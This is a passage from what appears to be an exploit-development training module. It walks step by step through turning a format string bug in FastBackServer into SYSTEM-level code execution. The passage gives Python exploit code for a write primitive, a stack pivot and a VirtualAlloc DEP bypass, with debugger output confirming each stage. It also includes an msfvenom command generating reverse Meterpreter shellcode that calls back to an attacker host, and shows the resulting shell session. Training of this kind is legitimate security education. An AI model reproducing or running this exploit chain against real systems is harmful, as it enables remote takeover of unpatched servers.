+04 0f4ce2d4 0054b6a0 FastBackServer!EventLog+0x13c
+05 0f4ce31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd
+06 0f52fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab
+07 0f52feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
+08 0f52fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
+09 0f52ff48 006693e9 FastBackServer!ORABR_Thread+0xef
+0a 0f52ff80 75f19564 FastBackServer!_beginthreadex+0xf4
+0b 0f52ff94 7722293c KERNEL32!BaseThreadInitThunk+0x24
+...
+Listing 33 - Call stack during byte write
+Our initial reverse engineering performed in a previous module determined that when the network packet is received, the handler function returns into FX_AGENT_Cyclic, after which the packet is processed.
+This means that the entire stack from entry 00 to 09 is modified between each network packet, and thus between each byte we write. We also know that the thread terminates when the network connection is closed.
+Putting this together, we can overwrite FastBackServer!_beginthreadex+0xf4 on the stack and it will be triggered when we call s.close() in our Python script. We also know that nothing in that part of the stack will change while our packets are processed. In essence, it is a stable overwrite.
+To find the exact location of the return address on the stack, we can display its contents from stack frame 09, as highlighted in the listing below.
+0:086> dds 0f52ff48 
+0f52ff48  0f52ff80
+0f52ff4c  006693e9 FastBackServer!_beginthreadex+0xf4
+0f52ff50  0771f6f0
+...
+Listing 34 - Location of return address on the stack
+This is the exact address on the stack we want to overwrite.
+Next, we need to determine the offset from the leaked stack address to the location of the return address. The leaked stack address is given in Listing 35.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x60087
+Stack address leaked to event log
+The eventlog returned contains 3403 bytes
+The size read is: 0x3403
+Leaked stack address is: 0xf4cded4
+Kernelbase address leaked to event log
+The eventlog returned contains 1d03 bytes
+The size read is: 0x1d03
+Leaked Kernelbase address is: 0x745dc36a
+Kernelbase base address is: 0x744d0000
+Listing 35 - Leaked stack address
+We've obtained both values, and Listing 36 shows the resulting offset.
+0:086> ? 0f52ff4c - 0xf4cded4
+Evaluate expression: 401528 = 00062078
+Listing 36 - Calculating the offset
+It's important to ensure that this offset remains constant between restarts of the application and exploitation attempts.
+If we restart FastBackServer, attach WinDbg, and execute the Python script with the input statement and no breakpoints, we can break into the execution and determine whether the offset remains constant.
+0:001> dds 0x114dded4 + 62078 L1
+1153ff4c  006693e9 FastBackServer!_beginthreadex+0xf4
+Listing 37 - Verifying the offset
+From this limited test, we can verify that the offset seems to remain static.
+We have now found a very promising and (hopefully) stable return address on the stack that we can overwrite. In the next section, we will try to obtain control of EIP.
+Exercises
+1.	Follow the analysis and verify that the offset is constant.
+2.	Are there any other viable return addresses?
+1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard
+12.2.2. Obtaining EIP Control
+With our target located, we can finally use our write primitive to gain control of EIP.
+In our Python code, we'll first calculate the location of the return address using the leaked stack address and the offset we found in the last section.
+We can invoke our write primitive from a function called writeDWORD (developed in a previous exercise). This will make it more modular and the code easier to read. Let's write the dummy value 0x41414141 at the location of the return address.
+print("Kernelbase base address is: " + str(hex(kernelbaseBase)))
+
+returnAddr = stackAddr + 0x62078
+
+print("About to overwrite return address at: " + str(hex(returnAddr)))
+input()
+
+writeDWORD(s, returnAddr, 0x41414141)
+
+print("Return address overwritten")
+input()
+
+s.close()
+sys.exit(0)
+Listing 38 - Code to overwrite return address
+Both prior to the write primitive and following it, we'll perform a print to the console and pause execution, so we can verify that everything is working correctly.
+When the exploit is executed, we can break into WinDbg and check the address we are about to overwrite.
+(277c.1d9c): Break instruction exception - code 80000003 (first chance)
+eax=003c1000 ebx=00000000 ecx=77289bc0 edx=77289bc0 esi=77289bc0 edi=77289bc0
+eip=77251430 esp=137fff54 ebp=137fff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!DbgBreakPoint:
+77251430 cc              int     3
+
+0:079> dds 0x136fff4c L1
+136fff4c  006693e9 FastBackServer!_beginthreadex+0xf4
+
+0:079> g
+Listing 39 - Checking return address before overwrite
+After letting execution continue in WinDbg, let's switch back to the Python script and enter a key to let execution continue.
+This will trigger the next call to input, and we now find that the return address has indeed been overwritten:
+(277c.f8): Break instruction exception - code 80000003 (first chance)
+eax=003c2000 ebx=00000000 ecx=77289bc0 edx=77289bc0 esi=77289bc0 edi=77289bc0
+eip=77251430 esp=138fff54 ebp=138fff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!DbgBreakPoint:
+77251430 cc              int     3
+
+0:079> dds 0x136fff4c L1
+136fff4c  41414141
+
+0:079> g
+Listing 40 - Checking return address after overwrite
+Our write primitive was successful! The return address has been overwritten on the stack.
+Continuing execution in both WinDbg and the Python script closes the network connection, triggering the use of the overwritten return address.
+(277c.1b6c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=060eaf60 ecx=136fff70 edx=011208d0 esi=060eaf60 edi=00669360
+eip=41414141 esp=136fff54 ebp=136fff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+41414141 ??              ???
+Listing 41 - We have obtain control of EIP
+EIP is now under our control. Hooray!
+In previous modules, we completely smashed the stack by overwriting out of the bounds of a fixed-size buffer. If the application uses stack cookies,1 the cookie itself is also overwritten and the application will terminate.
+Our write primitive overwrites with much more precision, bypassing such protections.
+Bypassing ASLR and gaining control of EIP is not the end of the exploitation process. To enable shellcode to run, we need to deal with DEP next.
+Exercise
+1.	Use your previous Python script to overwrite the return address on the stack and obtain control of EIP.
+1 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Buffer_overflow_protection
+12.3. Locating Storage Space
+Leveraging our ASLR bypass from the previous module, we can use ROP to bypass DEP and obtain code execution.
+Sadly, the data we have been working with so far is part of a format string, which is not an optimal storage location for a ROP chain or shellcode.
+In the next couple of sections, we will figure out where we can store a ROP chain and shellcode. We'll also need to find a suitable stack pivot gadget.
+12.3.1. Finding Buffers
+The format string used to create the write primitive cannot contain the ROP chain or shellcode because it is interpreted as a character string in multiple locations. We might be able to solve this with encoding, but let's consider an alternative.
+From our initial work reverse engineering psAgentCommand and psCommandBuffer, we know that our data is treated as three separate buffers. These three buffers are copied into unique stack buffers during initial processing.
+We want to send a last packet with an invalid opcode after the return address has been overwritten, then confirm whether the contents of the psCommandBuffers are still present in memory, when we gain control of EIP.
+Listing 42 shows the construction of a packet that will contain an opcode value of 0x80, which is below the minimum value of 0x100 found in FXCLI_OraBR_Exec_Command.
+print("Sending payload")
+# psAgentCommand
+buf = pack(">i", 0x400)
+buf += bytearray([0x41]*0xC)
+buf += pack("<i", 0x80)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x200)  # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += b"DDDDEEEEFFFFGGGGHHHH"
+buf += b"C" * 0x200
+
+# Padding
+buf += bytearray([0x41]*(0x404-len(buf)))
+s.send(buf)
+Listing 42 - Code to send payload packet
+For the content of the first psCommandBuffer, we'll enter an easily-recognizable buffer that we can search for.
+Let's update and execute the Python script. When the connection closes, EIP is overwritten with 0x41414141, triggering an access violation as shown in the previous section. At this point, we can search the stack for the psCommandBuffer.
+We'll start by using the !teb command to find the StackBase and StackLimit.
+0:088> !teb
+TEB at 003c0000
+    ExceptionList:        0fc0ff70 
+    StackBase:            0fc10000 
+    StackLimit:           0fb92000
+    SubSystemTib:         00000000
+...
+
+0:089> ? (0fc10000 - 0fb92000)/4
+Evaluate expression: 129024 = 0001f800
+Listing 43 - Finding the size of the current stack
+After finding the boundaries of the stack, we can calculate the number of DWORDs it requires. Searching for a single byte on the stack will likely result in multiple false positive results, but a value such as 0x44444444 does not commonly appear.
+We can use s to conduct a DWORD search for the content of the psCommandBuffer, which is why we needed to know the amount of DWORDs on the stack.
+0:089> s -d 0fb92000 L?1f800 0x44444444
+0fb95c20  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG
+0fc03b30  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG
+Listing 44 - Searching for the psCommandBuffer
+It seems we've successfully located two separate buffers containing our input. While we could select either buffer in theory, we should keep bad characters in mind.
+From the experience we have gained throughout this course and by reverse engineering the protocol processing of FastBackServer, we know that some copy operations introduce bad characters. When strcpy is used, NULL bytes will terminate the string. When sscanf is used, multiple characters will become bad characters, including NULL bytes. But when a copy operation is performed with memcpy, there are no bad characters.
+Based on this information, if we modify the packet to include one or more NULL bytes, we can (hopefully) locate a buffer that is free of bad characters.
+In Listing 45, the value 0x00000200 is appended to the unique string inside the code.
+# psCommandBuffer
+buf += b"DDDDEEEEFFFFGGGGHHHH"
+buf += pack("<i", 0x200)
+buf += b"C" * 0x200
+
+# Padding
+buf += bytearray([0x41]*(0x404-len(buf)))
+s.send(buf)
+Listing 45 - psCommandBuffer contains NULL bytes
+After restarting FastBackServer, attaching WinDbg, and executing the updated exploit, we'll again trigger the access violation to find the StackBase, StackLimit, and number of DWORDs on the stack.
+0:089> !teb
+TEB at 00340000
+    ExceptionList:        0fa7ff70
+    StackBase:            0fa80000
+    StackLimit:           0fa02000
+    SubSystemTib:         00000000
+    
+0:089> ? (0fa80000 - 0fa02000)/4
+Evaluate expression: 129024 = 0001f800
+Listing 46 - Finding the size of the current stack
+Next, we'll repeat the search for the psCommandBuffer.
+0:089> s -d 0fa02000 L?0001f800 0x44444444
+0fa05c20  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG
+0fa73b30  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG
+
+0:089> dd 0fa05c20 LC
+0fa05c20  44444444 45454545 46464646 47474747
+0fa05c30  48484848 43434300 43434343 43434343
+0fa05c40  43434343 43434343 43434343 43434343
+
+0:089> dd 0fa73b30 LC
+0fa73b30  44444444 45454545 46464646 47474747
+0fa73b40  48484848 00000200 43434343 43434343
+0fa73b50  43434343 43434343 43434343 43434343
+Listing 47 - Two copies of psCommandBuffer on the stack
+When we dump the contents of the two instances of the psCommandBuffer on the stack, we'll notice that the first instance does not handle the NULL bytes well.
+The second instance contains exactly the desired content, so we'll use it going forward.
+If we can reliably locate the buffer in memory, given the leaked stack pointer, it will serve as a perfect buffer location for the ROP chain and shellcode.
+Listing 48 shows the console output from running the Python script, giving us the leaked stack address.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x61eae
+Stack address leaked to event log
+The eventlog returned contains 3a03 bytes
+The size read is: 0x3a03
+Leaked stack address is: 0xfa1ded4
+Kernelbase address leaked to event log
+...
+Listing 48 - Leaked stack address from Python script
+We can now calculate the offset between the leaked stack address and the psCommandBuffer.
+0:089> ? 0fa73b30   - 0fa1ded4
+Evaluate expression: 351324 = 00055c5c
+Listing 49 - Offset from stack address to the psCommandBuffer
+Running the exploit multiple times reveals the offset from the leaked stack address to the second psCommandBuffer is constant.
+We can reliably use this as our storage buffer.
+In this section, we learned how to craft a final network packet containing a placeholder ROP chain and shellcode. Its location inside the psCommandBuffers on the stack is determined from our stack address leak.
+Next, we need to determine how to leverage a stack pivot so we can perform a ROP attack.
+Exercises
+1.	Update your code and follow the analysis in this section to locate the psCommandBuffers in memory.
+2.	Include NULL bytes as part of the psCommandBuffer and determine which of the two instances handles them correctly.
+3.	Verify that the offset between the leaked stack pointer and the psCommandBuffer remains constant across application restarts.
+12.3.2. Stack Pivot
+The ROP technique depends on our ability to control the stack. In many vulnerabilities, ESP does not automatically point to our ROP chain, so we'll need to modify it as our first step.
+If we attempt to overwrite EIP when we do not control the stack, we are typically limited to using only a single ROP gadget to pivot to the stack, otherwise we'll lose control of EIP and the application crashes.
+Common stack pivot gadgets are "MOV ESP, R32" or "XCHG ESP, R32", where R32 is any 32-bit register. These type of pivot gadgets work if any of the registers contain the address of the buffer where we put our ROP chain.
+EIP is overwritten when the network connection closes, which means the execution context will not be related to our input buffers. We'll need to be more creative to execute a stack pivot.
+Because of the stack leak and constant offset value to the psCommandBuffer, we know the absolute address of where the return address is stored when we overwrite EIP.
+With this in mind, let's place two DWORDs on the stack: the address of a "POP ESP; RET;" gadget, followed by the absolute stack address of the second psCommandBuffer portion. If we align them correctly, the "POP ESP" instruction will pop the address of the psCommandBuffer into ESP and return into it immediately, aligning it with the subsequent ROP chain.
+To avoid corrupting the gadget address with our write primitive, we'll need to write the absolute stack address of the second psCommandBuffer portion before the gadget.
+Using RP++ to generate gadgets from kernelbase.dll, we do not find any clean "POP ESP" gadgets. One of the most suitable options is shown in Listing 50.
+0x100e1af4: pop esp ; add esi, dword [ebp+0x03] ; mov al, 0x01 ; ret
+Listing 50 - Stack pivot gadget
+The side effects of this gadget are minimal. EBP will be a stack pointer by default, so the dereference does not cause an access violation, and modifying AL is not a problem.
+Now that we know what we want to put into EIP and how to pivot the stack, we need to determine an address for the second psCommandBuffer that will work with the pivot gadget.
+We can figure this out easily by looking back at the previous execution of our exploit and comparing the location of the return address we overwrote with the value in ESP when the access violation is triggered.
+Listing 51 repeats the output from the previous execution of the exploit and reveals the stack address at which we overwrote the return address.
+kali@kali:~$ python3 poc.py 192.168.120.10
+The optimal start value is: 0x6080e
+...
+Kernelbase address leaked to event log
+About to overwrite return address at: 0x136fff4c
+Return address overwritten
+Listing 51 - Return address on the stack
+Likewise, Listing 52 repeats the contents of the registers when EIP is overwritten and the access violation is caused.
+(277c.1b6c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=060eaf60 ecx=136fff70 edx=011208d0 esi=060eaf60 edi=00669360
+eip=41414141 esp=136fff54 ebp=136fff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+41414141 ??              ???
+Listing 52 - Address in ESP when EIP is overwritten
+A comparison of the two addresses (0x136fff4c and 0x136fff54) shows a difference of eight between the return overwrite address and the location to which we must write the psCommandBuffer address.
+We now have all the information we need to update the exploit code and trigger the stack pivot. The changes are given in Listing 53. First, we'll calculate the address of the second psCommandBuffer and the stack pivot gadget. We can then use the write primitive to place them both on the stack eight bytes apart.
+returnAddr = stackAddr + 0x62078
+bufAddr = stackAddr + 0x55c5c
+pivotAddr = kernelbaseBase + 0xe1af4
+
+print("About to overwrite return address at: " + str(hex(returnAddr)))
+writeDWORD(s, returnAddr, pivotAddr)
+writeDWORD(s, returnAddr+8, bufAddr)
+print("Return address overwritten")
+
+s.close()
+Listing 53 - Updated Python code to trigger stack pivot
+It's time to test our updated exploit.
+We'll restart FastBackServer, attach WinDbg, and set a breakpoint on the stack pivot at kernelbase+0xe1af4. When the exploit is executed, the breakpoint is successfully triggered, as shown in Listing 54.
+0:077> bp kernelbase+0xe1af4
+
+0:078> g
+Breakpoint 0 hit
+eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=060cbdb8 edi=00669360
+eip=745b1af4 esp=0fbaff54 ebp=0fbaff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNELBASE!ConsoleIsConsoleSubsystem+0x16:
+745b1af4 5c              pop     esp
+
+0:089> dd esp L4
+0fbaff54  0fba3b30 00000001 060cbdb8 00000000
+Listing 54 - Breakpoint on pivot gadget is triggered
+At the end of Listing 54, we dump the first four DWORDs of the stack, enabling us to observe the stack pivot taking place as soon as the "POP ESP" instruction is executed.
+0:089> p
+eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=060cbdb8 edi=00669360
+eip=745b1af5 esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNELBASE!ConsoleIsConsoleSubsystem+0x17:
+745b1af5 037503          add     esi,dword ptr [ebp+3] ss:0023:0fbaff83=f195640f
+
+0:089> dd esp L4
+0fba3b30  44444444 45454545 46464646 47474747
+Listing 55 - ESP is changed to the psCommandBuffer
+Listing 55 shows that our work has paid off and we managed to pivot the stack to the psCommandBuffer. Excellent!
+The final part of this pivot ensures that the remainder of the stack pivot gadget executes and returns us into the first DWORD of the psCommandBuffer.
+0:089> p
+eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360
+eip=745b1af8 esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
+KERNELBASE!ConsoleIsConsoleSubsystem+0x1a:
+745b1af8 b001            mov     al,1
+
+0:089> p
+eax=00000001 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360
+eip=745b1afa esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
+KERNELBASE!ConsoleIsConsoleSubsystem+0x1c:
+745b1afa c3              ret
+
+0:089> p
+eax=00000001 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360
+eip=44444444 esp=0fba3b34 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
+44444444 ??              ???
+Listing 56 - Stack pivot gadget executes to the end
+EIP now contains the first DWORD from the psCommandBuffer and ESP points correctly, which will allow us to invoke a ROP chain.
+In this section, we leveraged our write primitive to precisely align both EIP and ESP, setting the stage for a ROP attack.
+Exercise
+1.	Perform the modifications required in the exploit and step through the stack pivot.
+12.4. Getting Code Execution
+The analysis and development needed for this exploit has been intense, but we're nearing the end. Two challenges remain: disabling DEP and executing shellcode.
+To bypass DEP, we will use VirtualAlloc (as in previous modules) to modify the memory protections of the memory pages inside the psCommandBuffer that contains our shellcode.
+12.4.1. ROP Limitations
+When building our ROP chain, we first need to figure out which technique we'll use to bypass DEP, and then examine what arguments we must supply to the API in question.
+In this case, we'll use VirtualAlloc,1 the function prototype of which is given in Listing 57.
+LPVOID VirtualAlloc(
+  LPVOID lpAddress,
+  SIZE_T dwSize,
+  DWORD  flAllocationType,
+  DWORD  flProtect
+);
+Listing 57 - Function prototype for VirtualAlloc
+VirtualAlloc has four arguments. We will also need to supply the return address and the address of the function itself.
+In previous ROP attacks, we placed a ROP skeleton on the stack and dynamically updated the dummy values with correct values. This is often necessary due to three limitations:
+1.	The address of VirtualAlloc is not known beforehand due to ASLR.
+2.	The stack address of the shellcode is not known beforehand.
+3.	NULL bytes are bad characters and cannot be used.
+Let's examine each of these limitations while considering our current situation.
+Our ASLR bypass that leaks the base address of kernelbase.dll allows us to bypass the first limitation by simply adding an offset to its base address to obtain the address of VirtualAlloc. The stack address is also leaked beforehand, which means the second limitation does not apply either.
+Since we will place the ROP chain in the psCommandBuffer and we have already found that NULL bytes are allowed in this buffer, we can hardcode the values for dwSize, flAllocationType, and flProtect. The shellcode address can also be part of the buffer, even if it contains NULL bytes.
+All of our hard work and pre-determined knowledge essentially transforms the ROP chain attack into an old-fashioned Ret2Libc attack, enabling us to directly call into VirtualAlloc after the stack pivot.
+We'll need to set up the stack as illustrated in Listing 58 when the stack pivot finishes.
+VirtualAlloc address
+Return address == Shellcode address
+Shellcode address
+0x200
+0x1000
+0x40
+Listing 58 - VirtualAlloc arguments on the stack
+Since we use the psCommandBuffer of the last packet as our ROP and shellcode storage, we can directly place the VirtualAlloc related values into it, as shown in the code segment of Listing 59.
+print("Sending payload")
+# psAgentCommand
+buf = pack(">i", 0x400)
+buf += bytearray([0x41]*0xC)
+buf += pack("<i", 0x80)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x200)  # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += pack("<i", kernelbaseBase + 0x1125d0)
+buf += pack("<i", bufAddr + 0x18)
+buf += pack("<i", bufAddr + 0x18)
+buf += pack("<i", 0x200)
+buf += pack("<i", 0x1000)
+buf += pack("<i", 0x40)
+buf += b"C" * 0x200
+
+# Padding
+buf += bytearray([0x41]*(0x404-len(buf)))
+s.send(buf)
+Listing 59 - Implemented ret2lib packet
+The address of VirtualAlloc is found as an offset from the base address of kernelbase.dll, and the offset of 0x18 bytes from the psCommandBuffer aligns with the placeholder shellcode represented with C's.
+Now, let's restart FastBackServer, set a breakpoint on the stack pivot, and execute the updated Python code.
+0:067> bp kernelbase+0xe1af4
+
+0:067> g
+Breakpoint 0 hit
+eax=00000000 ebx=0610c280 ecx=0f61ff70 edx=00da08d0 esi=0610c280 edi=00669360
+eip=745b1af4 esp=0f61ff54 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNELBASE!ConsoleIsConsoleSubsystem+0x16:
+745b1af4 5c              pop     esp
+
+0:088> p
+...
+0:088> p
+eax=00000001 ebx=0610c280 ecx=0f61ff70 edx=00da08d0 esi=f7a6268f edi=00669360
+eip=745e25d0 esp=0f613b34 ebp=0f61ff80 iopl=0         nv up ei ng nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
+KERNELBASE!VirtualAlloc:
+745e25d0 8bff            mov     edi,edi
+
+0:088> dds esp L5
+0f613b34  0f613b48
+0f613b38  0f613b48
+0f613b3c  00000200
+0f613b40  00001000
+0f613b44  00000040
+Listing 60 - Pivoting into VirtualAlloc
+Once the stack pivot finishes, we'll land directly into VirtualAlloc and, as highlighted in Listing 60, the return address and required arguments are set.
+We can now verify that the return address contains our placeholder shellcode and check the memory protections of the shellcode location before VirtualAlloc is executed.
+0:088> u 0f613b48 L4
+0f613b48 43              inc     ebx
+0f613b49 43              inc     ebx
+0f613b4a 43              inc     ebx
+0f613b4b 43              inc     ebx
+
+0:088> !vprot 0f613b48
+BaseAddress:       0f613000
+AllocationBase:    0f520000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        0000d000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE
+Type:              00020000  MEM_PRIVATE
+Listing 61 - Memory protections before VirtualAlloc
+The return address is correctly aligned, and the current memory protection is set to read- and write-only.
+We can now let execution continue until VirtualAlloc completes.
+0:088> pt
+eax=0f613000 ebx=0610c280 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360
+eip=745e2623 esp=0f613b34 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNELBASE!VirtualAlloc+0x53:
+745e2623 c21000          ret     10h
+
+0:088> !vprot 0f613b48
+BaseAddress:       0f613000
+AllocationBase:    0f520000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000040  PAGE_EXECUTE_READWRITE
+Type:              00020000  MEM_PRIVATE
+Listing 62 - Memory protections after VirtualAlloc
+As highlighted in Listing 62, the return value from VirtualAlloc is non-zero, and the memory protections have been updated to readable, writable, and executable. Nice!
+The final proof of our success is shown in Listing 63, as we execute the placeholder shellcode on the stack.
+0:088> p
+eax=0f613000 ebx=0610c280 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360
+eip=0f613b48 esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0f613b48 43              inc     ebx
+
+0:088> p
+eax=0f613000 ebx=0610c281 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360
+eip=0f613b49 esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+0f613b49 43              inc     ebx
+
+0:088> p
+eax=0f613000 ebx=0610c282 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360
+eip=0f613b4a esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+0f613b4a 43              inc     ebx
+Listing 63 - Executing placeholder shellcode
+We were able to use our read and write primitives to bypass both ASLR and DEP, then obtain arbitrary code execution. What's left for us? To get a reverse shell.
+Exercises
+1.	Build the ret2libc-style buffer in the Python code.
+2.	Execute the exploit and bypass DEP to obtain arbitrary code execution.
+1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
+12.4.2. Getting a Shell
+After intensive effort, we have reached the final step of our exploit development. Now that we've obtained arbitrary code execution after bypassing DEP and ASLR, it's time to insert a real shellcode and get a reverse shell back.
+Let's start by generating the first stage shellcode. We can use msfvenom to generate a staged reverse Meterpreter payload with no bad characters defined, as shown in Listing 64.
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f python -v shell
+...
+Payload size: 678 bytes
+Final size of python file: 3306 bytes
+shell =  b""
+shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
+shell += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
+...
+shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
+shell += b"\xff\xd5"
+Listing 64 - Payload generation with msfvenom
+From our analysis in this module, we know that each connection to FastBackServer creates a new thread. We'll specify thread for the EXITFUNC option to ensure that the application does not crash when we exit our shell.
+We previously found the shellcode size to be 678 bytes, which is more than the default 0x100 bytes allotted to the first psCommandBuffer.
+In Listing 65, we have increased this size to 0x300 and appended the shellcode through the shell variable after the VirtualAlloc ret2lib information.
+print("Sending payload")
+# psAgentCommand
+buf = pack(">i", 0x400)
+buf += bytearray([0x41]*0xC)
+buf += pack("<i", 0x80)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x300)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x200)  # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += pack("<i", kernelbaseBase + 0x1125d0)
+buf += pack("<i", bufAddr + 0x18)
+buf += pack("<i", bufAddr + 0x18)
+buf += pack("<i", 0x200)
+buf += pack("<i", 0x1000)
+buf += pack("<i", 0x40)
+buf += shell
+
+# Padding
+buf += bytearray([0x41]*(0x404-len(buf)))
+s.send(buf)
+
+s.close()
+print("Shell is incoming!")
+Listing 65 - Shellcode is included in the payload packet
+Once the final exploit is executed, we'll successfully obtain a reverse Meterpreter shell, as displayed in Listing 66.
+msf5 exploit(multi/handler) > exploit
+
+[*] Started HTTP reverse handler on http://192.168.119.120:443
+[*] http://192.168.119.120:443 handling request from 192.168.120.10; (UUID: 5sme6pol) Staging x86 payload (181337 bytes) ...
+[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.10:53063)
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+Listing 66 - Obtaining a reverse Meterpreter shell from FastBackServer
+We've obtained a reverse shell by using the read and write primitive, only overwriting two DWORDs on the stack. Very nice!
+Exercises
+1.	Generate a reverse Meterpreter shellcode and insert it into the exploit.
+2.	Update the size field for the first psCommandBuffer and replace the placeholder shellcode with the Meterpreter shellcode in the payload packet.
+3.	Obtain a reverse Meterpreter shell from FastBackServer.
+12.5. Wrapping Up
+This module introduced us to the concept of a write primitive. We then created one through the format string vulnerability and combined it with the read primitive to obtain code execution.
+The length and complexity of the attack path shown in both this and the previous module indicates the kind of persistent and creative thinking processes required for advanced exploits targeted against complex applications, such as web browsers.
 
 # Portable Executable File Format
 
